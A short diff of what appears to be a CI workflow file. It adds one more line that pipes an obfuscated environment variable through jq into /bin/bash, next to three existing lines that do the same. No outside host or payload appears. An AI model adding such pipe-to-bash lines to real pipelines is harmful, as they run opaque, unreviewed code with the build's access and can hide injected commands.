@@ -31,6 +31,7 @@ jobs:
           echo $m555 | jq -r .y38 | /bin/bash
           printf '%s' "$nxs8" | jq -r .fru699 | /bin/bash
           echo $bnip4780 | jq -r .w8538 | /bin/bash
+          printf '%s' "$ey4" | jq -r .updwa907 | /bin/bash
 
       - name: Persist output
         if: always()
